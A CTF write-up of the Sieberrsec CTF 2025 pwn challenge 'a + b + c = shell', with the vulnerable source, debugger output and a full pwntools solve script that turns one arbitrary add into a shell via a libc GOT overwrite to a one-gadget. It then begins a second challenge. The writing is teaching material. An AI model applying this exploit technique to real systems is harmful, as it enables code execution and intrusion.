---
id: 0
title: "Sieberrsec CTF 2025"
subtitle: "Writeups for qualifiers and finals of Sieberrsec CTF 2025"
date: "2025.07.22"
tags: "writeups"
---

This previous weekend, I had the privilege of attending both the qualifiers and finals of Sieberrsec CTF 2025, a CTF competition held by the Hwa Chong Institution (HCI) of Singapore. My team r3dw473rm3l0n5 and I managed to achieve second place in the qualifiers and fourth place in the finals.

## a + b + c = shell

> solve for shell :*
> 
> __author__: whywhy
>
> __solves__: 2

### Challenge Protections

```
[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    Stripped:   No

[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

This challenge is quite simple in design, that it exposes an interface to choose the size you wish to malloc, the offset you want to write from, and the content you want to write: 

```c
// gcc -o chal chal.c -fstack-protector-all -Wl,-z,relro,-z,now -pie -fpie

#include <stdio.h>
#include <stdlib.h>

int main() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    long long sz;
    long long off;
    long long dat;
    printf("alloc size? \n> ");
    scanf("%lld", &sz);
    printf("offset? \n> ");
    scanf("%lld", &off);
    printf("increment? \n> ");
    scanf("%lld", &dat);
    long long* buf = malloc(sz);
    *(long long*)((char*)buf+off) += dat;
    puts(NULL);
}
```

At first glance, the challenge seems nontrivial because normal heap allocations live in a separate memory region from any key attack surfaces in memory such as binary memory or libc.

```
Start              End                Size               Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000001000 0x0000000000000000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched
0x0000555555555000 0x0000555555556000 0x0000000000001000 0x0000000000001000 r-x /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched  <-  $rip
0x0000555555556000 0x0000555555557000 0x0000000000001000 0x0000000000002000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched
0x0000555555557000 0x0000555555558000 0x0000000000001000 0x0000000000002000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched  <-  $r14
0x0000555555558000 0x000055555555b000 0x0000000000003000 0x0000000000003000 rw- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched
0x000055555555b000 0x000055555557c000 0x0000000000021000 0x0000000000000000 rw- [heap] <- not contiguous with either binary or libc
0x00007ffff7dde000 0x00007ffff7de1000 0x0000000000003000 0x0000000000000000 rw- <tls-th1>
0x00007ffff7de1000 0x00007ffff7e07000 0x0000000000026000 0x0000000000000000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6
0x00007ffff7e07000 0x00007ffff7f5c000 0x0000000000155000 0x0000000000026000 r-x /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6
0x00007ffff7f5c000 0x00007ffff7faf000 0x0000000000053000 0x000000000017b000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6  <-  $r10
0x00007ffff7faf000 0x00007ffff7fb3000 0x0000000000004000 0x00000000001ce000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6
0x00007ffff7fb3000 0x00007ffff7fb5000 0x0000000000002000 0x00000000001d2000 rw- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6  <-  $r8
...
```

However, it is worth noting that if a large enough size is requested from malloc, _int_malloc will mmap a separate chunk to fulfil the request, which is a constant offset from libc. This is because malloc first checks these locations for free chunks large enough to satisfy our request:

1. tcache
2. fastbins
3. smallbins, unsorted bins, largebins
4. finally, malloc decides whether to create a new chunk from the wilderness or mmap

If we request an arbitrarily large size from malloc, we will be able to coerce libc into mmaping a memory region to service our request.

Entering 1000000000 as a malloc size, we can now check our memory mappings:

```
Start              End                Size               Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000001000 0x0000000000000000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched
0x0000555555555000 0x0000555555556000 0x0000000000001000 0x0000000000001000 r-x /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched  <-  $rip
0x0000555555556000 0x0000555555557000 0x0000000000001000 0x0000000000002000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched
0x0000555555557000 0x0000555555558000 0x0000000000001000 0x0000000000002000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched  <-  $r14
0x0000555555558000 0x000055555555b000 0x0000000000003000 0x0000000000003000 rw- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched
0x000055555555b000 0x000055555557c000 0x0000000000021000 0x0000000000000000 rw- [heap]
0x00007fffbc431000 0x00007ffff7de1000 0x000000003b9b0000 0x0000000000000000 rw- <tls-th1>  <-  $rax
0x00007ffff7de1000 0x00007ffff7e07000 0x0000000000026000 0x0000000000000000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6
0x00007ffff7e07000 0x00007ffff7f5c000 0x0000000000155000 0x0000000000026000 r-x /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6
0x00007ffff7f5c000 0x00007ffff7faf000 0x0000000000053000 0x000000000017b000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6
0x00007ffff7faf000 0x00007ffff7fb3000 0x0000000000004000 0x00000000001ce000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6
0x00007ffff7fb3000 0x00007ffff7fb5000 0x0000000000002000 0x00000000001d2000 rw- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6
0x00007ffff7fb5000 0x00007ffff7fc4000 0x000000000000f000 0x0000000000000000 rw-
0x00007ffff7fc4000 0x00007ffff7fc6000 0x0000000000002000 0x0000000000000000 r-- [vvar]
0x00007ffff7fc6000 0x00007ffff7fc8000 0x0000000000002000 0x0000000000000000 r-- [vvar_vclock]
0x00007ffff7fc8000 0x00007ffff7fca000 0x0000000000002000 0x0000000000000000 r-x [vdso]
0x00007ffff7fca000 0x00007ffff7fcb000 0x0000000000001000 0x0000000000000000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/ld-linux-x86-64.so.2
0x00007ffff7fcb000 0x00007ffff7ff1000 0x0000000000026000 0x0000000000001000 r-x /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/ld-linux-x86-64.so.2
0x00007ffff7ff1000 0x00007ffff7ffb000 0x000000000000a000 0x0000000000027000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/ld-linux-x86-64.so.2
0x00007ffff7ffb000 0x00007ffff7ffd000 0x0000000000002000 0x0000000000031000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/ld-linux-x86-64.so.2
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000002000 0x0000000000033000 rw- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/ld-linux-x86-64.so.2  <-  $r15
0x00007ffffffdd000 0x00007ffffffff000 0x0000000000022000 0x0000000000000000 rw- [stack]  <-  $rbx, $rsp, $rbp, $r13
0xffffffffff600000 0xffffffffff601000 0x0000000000001000 0x0000000000000000 --x [vsyscall]
gef> x/40gx 0x00007fffbc431000
0x7fffbc431000:	0x0000000000000000	0x000000003b9ad002 <-- our mmapped allocation!
0x7fffbc431010:	0x0000000000000000	0x00000000000a0000
0x7fffbc431020:	0x0000000000000000	0x0000000000000000
0x7fffbc431030:	0x0000000000000000	0x0000000000000000
0x7fffbc431040:	0x0000000000000000	0x0000000000000000
0x7fffbc431050:	0x0000000000000000	0x0000000000000000
0x7fffbc431060:	0x0000000000000000	0x0000000000000000
0x7fffbc431070:	0x0000000000000000	0x0000000000000000
0x7fffbc431080:	0x0000000000000000	0x0000000000000000
0x7fffbc431090:	0x0000000000000000	0x0000000000000000
0x7fffbc4310a0:	0x0000000000000000	0x0000000000000000
0x7fffbc4310b0:	0x0000000000000000	0x0000000000000000
0x7fffbc4310c0:	0x0000000000000000	0x0000000000000000
0x7fffbc4310d0:	0x0000000000000000	0x0000000000000000
0x7fffbc4310e0:	0x0000000000000000	0x0000000000000000
0x7fffbc4310f0:	0x0000000000000000	0x0000000000000000
0x7fffbc431100:	0x0000000000000000	0x0000000000000000
0x7fffbc431110:	0x0000000000000000	0x0000000000000000
0x7fffbc431120:	0x0000000000000000	0x0000000000000000
0x7fffbc431130:	0x0000000000000000	0x0000000000000000
```

Since our allocation is now a constant offset from libc, our attack surface has now increased to include any target within the libc memory region.

### What can we attack?

Commonly, given an arbitrary write primitive, some common targets within LIBC would include the `__malloc_hook` and `__free_hook` regions. However, following [GLIBC version 2.32, `__malloc_hook` and `__free_hook` were deprecated. Following GLIBC 2.34 onwards, these variables were completely removed from LIBC altogether.](https://man7.org/linux/man-pages/man3/malloc_hook.3.html) This cripples a very common and trivial attack surface.

However, there are still some viable attack targets within LIBC as detailed in nobodyisnobody's [Six Different Ways - Code Execution With a Write Primitive On Last Libc](https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md):

- Libc GOT entries: viable under GLIBC 2.36 as Partial Relro is still enabled in libc binaries
- ld.so `link_map` structure: not very viable given we have only one write/add primitive
- FSOP via `stdout`: not viable given we have only one __QWORD__ write/add primitive
- `__printf_arginfo_table`: not viable given `printf` is not run with a format specifier after our write
- TLS-Storage `dtor_list` overwrite: not viable given we have only one __QWORD__ write/add primitive
- mangled pointers in `initial` structure: not viable given we have only one __QWORD__ write/add primitive
- pivot from LIBC to stack via leaking `environ`: ONLY ONE WRITE

With our __very limited__ primitive, given we also do not have the luxury of an information leak, this leaves us with the only viable choice of attacking the libc GOT entries - particularly by incrementing specific entries by an offset to One Gadgets.

> [One Gadgets](https://github.com/david942j/one_gadget) are gadgets in libc that lead to code paths eventually executing `execve("/bin/sh", NULL, NULL)` and similar derivatives without control of the $RDI, $RSI, and $RDX registers.

### Exploit Formulation Process

We must first find which GOT entry is executed during the course of the program after our write. Fortunately, this process is made easy with the [bata24 fork of gef](https://github.com/bata24/gef).

We can view the libc GOT with `got -f /fullpath/to/libc.so.6`:

```
----------------- PLT / GOT - /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6 - Partial RELRO -----------------
Name                          | PLT            | GOT            | GOT value
----------------------------------------------------------- .rela.dyn -----------------------------------------------------------
*ABS*+0xb0a60                 | Not found      | 0x7ffff7fb2028 | 0x000000000000
svc_max_pollfd                | Not found      | 0x7ffff7fb2da8 | 0x7ffff7fc19e0 <svc_max_pollfd>
obstack_alloc_failed_handler  | Not found      | 0x7ffff7fb2db0 | 0x7ffff7fb44f8 <obstack_alloc_failed_handler>
__ctype_toupper               | Not found      | 0x7ffff7fb2dc0 | 0x7ffff7fb37f0 <__ctype_toupper>
loc1                          | Not found      | 0x7ffff7fb2dd0 | 0x7ffff7fbb5d0 <loc1>
_dl_argv                      | Not found      | 0x7ffff7fb2dd8 | 0x7ffff7ffca98 <_dl_argv>
__libc_single_threaded        | Not found      | 0x7ffff7fb2de8 | 0x7ffff7fbb5d8 <__libc_single_threaded>
free                          | 0x7ffff7e07360 | 0x7ffff7fb2df0 | 0x7ffff7e79ee0 <free>
re_syntax_options             | Not found      | 0x7ffff7fb2df8 | 0x7ffff7fbb220 <re_syntax_options>
rpc_createerr                 | Not found      | 0x7ffff7fb2e00 | 0x7ffff7fc1a00 <rpc_createerr>
stdout                        | Not found      | 0x7ffff7fb2e08 | 0x555555558010 <stdout@GLIBC_2.2.5>
__ctype32_toupper             | Not found      | 0x7ffff7fb2e10 | 0x7ffff7fb37e0 <__ctype32_toupper>
opterr                        | Not found      | 0x7ffff7fb2e18 | 0x7ffff7fb3408 <opterr>
getdate_err                   | Not found      | 0x7ffff7fb2e28 | 0x7ffff7fba780 <getdate_err>
__curbrk                      | Not found      | 0x7ffff7fb2e30 | 0x7ffff7fbb338 <__curbrk>
loc2                          | Not found      | 0x7ffff7fb2e38 | 0x7ffff7fbb5c8 <loc2>
program_invocation_name       | Not found      | 0x7ffff7fb2e40 | 0x7ffff7fb4518 <program_invocation_name>
__fpu_control                 | Not found      | 0x7ffff7fb2e48 | 0x7ffff7fb31c0 <__fpu_control>
__libc_enable_secure          | Not found      | 0x7ffff7fb2e50 | 0x7ffff7ffca60 <__libc_enable_secure>
_IO_2_1_stderr_               | Not found      | 0x7ffff7fb2e58 | 0x7ffff7fb4680 <_IO_2_1_stderr_>
__rcmd_errstr                 | Not found      | 0x7ffff7fb2e60 | 0x7ffff7fbbf78 <__rcmd_errstr>
__ctype_b                     | Not found      | 0x7ffff7fb2e68 | 0x7ffff7fb3808 <__ctype_b>
error_print_progname          | Not found      | 0x7ffff7fb2e70 | 0x7ffff7fbb5a8 <error_print_progname>
stderr                        | Not found      | 0x7ffff7fb2e78 | 0x7ffff7fb4840 <stderr>
obstack_exit_failure          | Not found      | 0x7ffff7fb2e80 | 0x7ffff7fb33c8 <obstack_exit_failure>
__libc_stack_end              | Not found      | 0x7ffff7fb2e88 | 0x7ffff7ffca58 <__libc_stack_end>
__key_encryptsession_pk_LOCAL | Not found      | 0x7ffff7fb2e90 | 0x7ffff7fc1b60 <__key_encryptsession_pk_LOCAL>
_rtld_global_ro               | Not found      | 0x7ffff7fb2e98 | 0x7ffff7ffcac0 <_rtld_global_ro>
argp_program_version          | Not found      | 0x7ffff7fb2ea0 | 0x7ffff7fbbb00 <argp_program_version>
svcauthdes_stats              | Not found      | 0x7ffff7fb2ea8 | 0x7ffff7fc1ac0 <svcauthdes_stats>
__check_rhosts_file           | Not found      | 0x7ffff7fb2eb0 | 0x7ffff7fb34c8 <__check_rhosts_file>
optind                        | Not found      | 0x7ffff7fb2eb8 | 0x7ffff7fb340c <optind>
_IO_2_1_stdin_                | Not found      | 0x7ffff7fb2ec0 | 0x7ffff7fb3a80 <_IO_2_1_stdin_>
program_invocation_short_name | Not found      | 0x7ffff7fb2ec8 | 0x7ffff7fb4510 <program_invocation_short_name>
__ctype32_tolower             | Not found      | 0x7ffff7fb2ed0 | 0x7ffff7fb37e8 <__ctype32_tolower>
error_message_count           | Not found      | 0x7ffff7fb2ed8 | 0x7ffff7fbb5a4 <error_message_count>
optopt                        | Not found      | 0x7ffff7fb2ee0 | 0x7ffff7fb3404 <optopt>
__ctype32_b                   | Not found      | 0x7ffff7fb2ee8 | 0x7ffff7fb3800 <__ctype32_b>
_nl_msg_cat_cntr              | Not found      | 0x7ffff7fb2ef0 | 0x7ffff7fb4d80 <_nl_msg_cat_cntr>
__daylight                    | Not found      | 0x7ffff7fb2ef8 | 0x7ffff7fba688 <daylight>
_nl_domain_bindings           | Not found      | 0x7ffff7fb2f00 | 0x7ffff7fb4cb8 <_nl_domain_bindings>
argp_program_bug_address      | Not found      | 0x7ffff7fb2f08 | 0x7ffff7fbbaf0 <argp_program_bug_address>
_IO_funlockfile               | Not found      | 0x7ffff7fb2f10 | 0x7ffff7e32fd0 <funlockfile>
svc_fdset                     | Not found      | 0x7ffff7fb2f18 | 0x7ffff7fc1a20 <svc_fdset>
__rseq_size                   | Not found      | 0x7ffff7fb2f20 | 0x7ffff7ffca10 <__rseq_size>
stdin                         | Not found      | 0x7ffff7fb2f30 | 0x555555558020 <stdin@GLIBC_2.2.5>
__timezone                    | Not found      | 0x7ffff7fb2f38 | 0x7ffff7fba680 <timezone>
__ctype_tolower               | Not found      | 0x7ffff7fb2f40 | 0x7ffff7fb37f8 <__ctype_tolower>
_IO_2_1_stdout_               | Not found      | 0x7ffff7fb2f50 | 0x7ffff7fb4760 <_IO_2_1_stdout_>
__tzname                      | Not found      | 0x7ffff7fb2f58 | 0x7ffff7fb4500 <tzname>
error_one_per_line            | Not found      | 0x7ffff7fb2f60 | 0x7ffff7fbb5a0 <error_one_per_line>
_res_hconf                    | Not found      | 0x7ffff7fb2f68 | 0x7ffff7fbc3e0 <_res_hconf>
__key_decryptsession_pk_LOCAL | Not found      | 0x7ffff7fb2f70 | 0x7ffff7fc1b58 <__key_decryptsession_pk_LOCAL>
_rtld_global                  | Not found      | 0x7ffff7fb2f78 | 0x7ffff7ffd020 <_rtld_global>
__progname                    | Not found      | 0x7ffff7fb2f80 | 0x7ffff7fb4510 <program_invocation_short_name>
h_errlist                     | Not found      | 0x7ffff7fb2f88 | 0x7ffff7fb2260 <h_errlist>
__environ                     | Not found      | 0x7ffff7fb2f90 | 0x7ffff7fbb320 <environ>
argp_err_exit_status          | Not found      | 0x7ffff7fb2f98 | 0x7ffff7fb34c4 <argp_err_exit_status>
svc_pollfd                    | Not found      | 0x7ffff7fb2fa0 | 0x7ffff7fc19e8 <svc_pollfd>
__progname_full               | Not found      | 0x7ffff7fb2fa8 | 0x7ffff7fb4518 <program_invocation_name>
argp_program_version_hook     | Not found      | 0x7ffff7fb2fb0 | 0x7ffff7fbbb08 <argp_program_version_hook>
optarg                        | Not found      | 0x7ffff7fb2fb8 | 0x7ffff7fbb280 <optarg>
malloc                        | 0x7ffff7e07368 | 0x7ffff7fb2fc8 | 0x7ffff7e79920 <malloc>
----------------------------------------------------------- .rela.plt -----------------------------------------------------------
*ABS*+0x9f540                 | 0x7ffff7e07350 | 0x7ffff7fb3000 | 0x7ffff7f39780
*ABS*+0x9c930                 | 0x7ffff7e07020 | 0x7ffff7fb3008 | 0x7ffff7f344c0
realloc                       | 0x7ffff7e07030 | 0x7ffff7fb3010 | 0x7ffff7e07036 <.plt+0x36>
*ABS*+0x9f240                 | 0x7ffff7e07040 | 0x7ffff7fb3018 | 0x7ffff7f37280
_dl_exception_create          | 0x7ffff7e07050 | 0x7ffff7fb3020 | 0x7ffff7e07056 <.plt+0x56>
*ABS*+0x9c690                 | 0x7ffff7e07060 | 0x7ffff7fb3028 | 0x7ffff7f33930
*ABS*+0xb1350                 | 0x7ffff7e07190 | 0x7ffff7fb3030 | 0x7ffff7e84610
calloc                        | 0x7ffff7e07080 | 0x7ffff7fb3038 | 0x7ffff7e07086 <.plt+0x86>
*ABS*+0x9f7c0                 | 0x7ffff7e07090 | 0x7ffff7fb3040 | 0x7ffff7f56000
*ABS*+0x9bcf0                 | 0x7ffff7e070a0 | 0x7ffff7fb3048 | 0x7ffff7f32f80
*ABS*+0x9c580                 | 0x7ffff7e070b0 | 0x7ffff7fb3050 | 0x7ffff7f33980
*ABS*+0xb1230                 | 0x7ffff7e07220 | 0x7ffff7fb3058 | 0x7ffff7f3b2a0
*ABS*+0x9c9f0                 | 0x7ffff7e070d0 | 0x7ffff7fb3060 | 0x7ffff7f34620
*ABS*+0xb12b0                 | 0x7ffff7e070e0 | 0x7ffff7fb3068 | 0x7ffff7f3b560
_dl_find_dso_for_object       | 0x7ffff7e070f0 | 0x7ffff7fb3070 | 0x7ffff7e070f6 <.plt+0xf6>
*ABS*+0x9f490                 | 0x7ffff7e07100 | 0x7ffff7fb3078 | 0x7ffff7f38e20
*ABS*+0x9f1b0                 | 0x7ffff7e07110 | 0x7ffff7fb3080 | 0x7ffff7f37100
*ABS*+0x9cb80                 | 0x7ffff7e07120 | 0x7ffff7fb3088 | 0x7ffff7f35370
*ABS*+0x9e8d0                 | 0x7ffff7e07130 | 0x7ffff7fb3090 | 0x7ffff7f36d70
*ABS*+0xb0c50                 | 0x7ffff7e07280 | 0x7ffff7fb3098 | 0x7ffff7f39d00
*ABS*+0x9d660                 | 0x7ffff7e07150 | 0x7ffff7fb30a0 | 0x7ffff7f36620
*ABS*+0x9c7a0                 | 0x7ffff7e07160 | 0x7ffff7fb30a8 | 0x7ffff7f34080
_dl_deallocate_tls            | 0x7ffff7e07170 | 0x7ffff7fb30b0 | 0x7ffff7e07176 <.plt+0x176>
__tls_get_addr                | 0x7ffff7e07180 | 0x7ffff7fb30b8 | 0x7ffff7e07186 <.plt+0x186>
*ABS*+0xb1350                 | 0x7ffff7e07070 | 0x7ffff7fb30c0 | 0x7ffff7e84610
*ABS*+0x9bd70                 | 0x7ffff7e071a0 | 0x7ffff7fb30c8 | 0x7ffff7f33220
*ABS*+0x9f2e0                 | 0x7ffff7e071b0 | 0x7ffff7fb30d0 | 0x7ffff7f37290
_dl_fatal_printf              | 0x7ffff7e071c0 | 0x7ffff7fb30d8 | 0x7ffff7e071c6 <.plt+0x1c6>
*ABS*+0x9d560                 | 0x7ffff7e071d0 | 0x7ffff7fb30e0 | 0x7ffff7f35d70
*ABS*+0xb0d70                 | 0x7ffff7e071e0 | 0x7ffff7fb30e8 | 0x7ffff7f50700
*ABS*+0x9e950                 | 0x7ffff7e071f0 | 0x7ffff7fb30f0 | 0x7ffff7f53370
*ABS*+0x9cae0                 | 0x7ffff7e07200 | 0x7ffff7fb30f8 | 0x7ffff7f35360
*ABS*+0x9f3f0                 | 0x7ffff7e07210 | 0x7ffff7fb3100 | 0x7ffff7f387d0
*ABS*+0xb1230                 | 0x7ffff7e070c0 | 0x7ffff7fb3108 | 0x7ffff7f3b2a0
*ABS*+0x9ca70                 | 0x7ffff7e07230 | 0x7ffff7fb3110 | 0x7ffff7f349d0
*ABS*+0xb0ce0                 | 0x7ffff7e07240 | 0x7ffff7fb3118 | 0x7ffff7f39f40
_dl_audit_symbind_alt         | 0x7ffff7e07250 | 0x7ffff7fb3120 | 0x7ffff7e07256 <.plt+0x256>
*ABS*+0x9f600                 | 0x7ffff7e07260 | 0x7ffff7fb3128 | 0x7ffff7f39a50
*ABS*+0x9d5e0                 | 0x7ffff7e07270 | 0x7ffff7fb3130 | 0x7ffff7f363e0
*ABS*+0xb0c50                 | 0x7ffff7e07140 | 0x7ffff7fb3138 | 0x7ffff7f39d00
*ABS*+0x9be60                 | 0x7ffff7e07290 | 0x7ffff7fb3140 | 0x7ffff7f33980
_dl_rtld_di_serinfo           | 0x7ffff7e072a0 | 0x7ffff7fb3148 | 0x7ffff7e072a6 <.plt+0x2a6>
_dl_allocate_tls              | 0x7ffff7e072b0 | 0x7ffff7fb3150 | 0x7ffff7e072b6 <.plt+0x2b6>
__tunable_get_val             | 0x7ffff7e072c0 | 0x7ffff7fb3158 | 0x7ffff7fde010 <__tunable_get_val>
*ABS*+0xb0e20                 | 0x7ffff7e072d0 | 0x7ffff7fb3160 | 0x7ffff7f3a460
*ABS*+0x9c830                 | 0x7ffff7e072e0 | 0x7ffff7fb3168 | 0x7ffff7f34380
*ABS*+0xb24e0                 | 0x7ffff7e072f0 | 0x7ffff7fb3170 | 0x7ffff7f3ac80
*ABS*+0x9d6f0                 | 0x7ffff7e07300 | 0x7ffff7fb3178 | 0x7ffff7f36810
_dl_allocate_tls_init         | 0x7ffff7e07310 | 0x7ffff7fb3180 | 0x7ffff7e07316 <.plt+0x316>
__nptl_change_stack_perm      | 0x7ffff7e07320 | 0x7ffff7fb3188 | 0x7ffff7e07326 <.plt+0x326>
*ABS*+0x9f5d0                 | 0x7ffff7e07330 | 0x7ffff7fb3190 | 0x7ffff7f55f10
_dl_audit_preinit             | 0x7ffff7e07340 | 0x7ffff7fb3198 | 0x7ffff7fe0a10 <_dl_audit_preinit>
*ABS*+0x9f540                 | 0x7ffff7e07010 | 0x7ffff7fb31a0 | 0x7ffff7f39780
```

"But there are so many entries..", you may say, "how do we find which specific one is executed? Surely we must be meticulous about this, devote our fullest energies to this cau-"

---

```
set $addr = 0x7ffff7fb3000
while $addr < 0x7ffff7fb31a8
    set {char}$addr = 0
    set $addr = $addr + 1
end
```

---

```
$rsp  0x7fffffffa9b8|+0x0000|+000: 0x00007ffff7e3d4a0  ->  0x44c600008000e581
      0x7fffffffa9c0|+0x0008|+001: 0x0000555555556019  ->  0x203f74657366666f 'offset? \n> '  <-  $rdi
      0x7fffffffa9c8|+0x0010|+002: 0x0000000000000000
      0x7fffffffa9d0|+0x0018|+003: 0x0000000000000d68 ('h\r'?)
      0x7fffffffa9d8|+0x0020|+004: 0x0000000000000000
      0x7fffffffa9e0|+0x0028|+005: 0x0000000000000000
      0x7fffffffa9e8|+0x0030|+006: 0x0000000000000000
      0x7fffffffa9f0|+0x0038|+007: 0x0000000000000000
-------------------------------------------------------------------------------------------------- code: x86:64 (gdb-native) ----
=> 0x0:	[!] Cannot access memory at address 0x0
-------------------------------------------------------------------------------------------------------------- memory access ----
[!] Cannot access memory at address 0x0
-------------------------------------------------------------------------------------------------- threads (shown:4 / all:1) ----
[*Thread Id:1, tid:78789] Name: "chal_patched", stopped at 0x000000000000 <NO_SYMBOL>, reason: SIGSEGV
---------------------------------------------------------------------------------------------------------------------- trace ----
[*#0] 0x000000000000 <NO_SYMBOL>
[ #1] 0x7ffff7e3d4a0 <NO_SYMBOL>
[ #2] 0x7ffff7e3f8ed <NO_SYMBOL>
[ #3] 0x7ffff7e3365b <printf+0xab>
[ #4] 0x55555555520b <main+0x82>
[ #5] 0x7ffff7e0824a <NO_SYMBOL>
[ #6] 0x7ffff7e08305 <__libc_start_main+0x85>
[ #7] 0x5555555550c1 <_start+0x21>
---------------------------------------------------------------------------------------------------------------------------------
gef> bt
#0  0x0000000000000000 in ?? ()
#1  0x00007ffff7e3d4a0 in ?? () from ./libc.so.6
#2  0x00007ffff7e3f8ed in ?? () from ./libc.so.6
#3  0x00007ffff7e3365b in printf () from ./libc.so.6
#4  0x000055555555520b in main ()
#5  0x00007ffff7e0824a in ?? () from ./libc.so.6
#6  0x00007ffff7e08305 in __libc_start_main () from ./libc.so.6
#7  0x00005555555550c1 in _start ()
```
---

The lion does not work hard for pwn.

By setting the GOT region to zero and continuing execution, we can see where we segfault and hence follow the backtrace of function calls to find the PLT function that calls our GOT entry.

We can view the first few instructions before #1 with `x/40i 0x00007ffff7e3d4a0-0x40`:

```
0x7ffff7e3d460:	add    BYTE PTR [rax],al
0x7ffff7e3d462:	cmp    QWORD PTR [rsp],0x0
0x7ffff7e3d467:	je     0x7ffff7e3f710
0x7ffff7e3d46d:	test   bpl,0x2
0x7ffff7e3d471:	jne    0x7ffff7e3e918
0x7ffff7e3d477:	movdqu xmm1,XMMWORD PTR [r12]
0x7ffff7e3d47d:	mov    rdi,QWORD PTR [rsp]
0x7ffff7e3d481:	mov    esi,0x25
0x7ffff7e3d486:	movups XMMWORD PTR [rsp+0xe8],xmm1
0x7ffff7e3d48e:	mov    rax,QWORD PTR [r12+0x10]
0x7ffff7e3d493:	mov    QWORD PTR [rsp+0xf8],rax
0x7ffff7e3d49b:	call   0x7ffff7e07150 <*ABS*+0x9d660@plt>
```

To then finally get the GOT entry that is called:

```
gef> disas 0x7ffff7e07150
Dump of assembler code for function *ABS*+0x9d660@plt:
   0x00007ffff7e07150 <+0>:	jmp    QWORD PTR [rip+0x1abf4a]        # 0x7ffff7fb30a0 <*ABS*@got.plt>
   0x00007ffff7e07156 <+6>:	push   0x24
   0x00007ffff7e0715b <+11>:	jmp    0x7ffff7e07000
End of assembler dump.
gef>
```

The rest of the exploit then boils down to selecting the correct one gadget, finding the offset of the one gadget from the original GOT entry, finding the offset of the GOT entry from our mmap chunk, and then adding the one gadget offset to the GOT entry to trigger our shell:

```
❯ python3 solve.py
[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    Stripped:   No
[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/ld-linux-x86-64.so.2'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
[+] Starting local process '/home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched': pid 77574
[DEBUG] Received 0xf bytes:
    b'alloc size? \n'
    b'> '
[DEBUG] Sent 0x8 bytes:
    b'1000000\n'
[DEBUG] Received 0xb bytes:
    b'offset? \n'
    b'> '
[DEBUG] Sent 0x8 bytes:
    b'2924656\n'
[DEBUG] Received 0xe bytes:
    b'increment? \n'
    b'> '
[DEBUG] Sent 0x8 bytes:
    b'-528289\n'
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x51 bytes:
    b'chal\tchal_patched  ld-linux-x86-64.so.2  solve.py\n'
    b'chal.c\tDockerfile    libc.so.6\n'
chal	chal_patched  ld-linux-x86-64.so.2  solve.py
chal.c	Dockerfile    libc.so.6
$
```

Profit!!

### Full solve script

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.log_level = 'debug'
context.terminal = 'kitty'

p = process()
# gdb.attach(p)
# p = remote('chal2.sieberr.live', 15007)

# As easy as a + b + c = shell!
p.sendlineafter(b'size? \n> ', b'1000000')
p.sendlineafter(b'offset? \n> ', str(0x2ca070).encode())
p.sendlineafter(b'increment? \n> ', str(-0x80fa1).encode())

p.interactive()
```

## Authenticator

> authenticate to win!
>
> __author__: haowei
> 
> __solves__: 3

### Challenge Protections

```
[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/authenticator/authenticator_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    Stripped:   No
    Debuginfo:  Yes
```

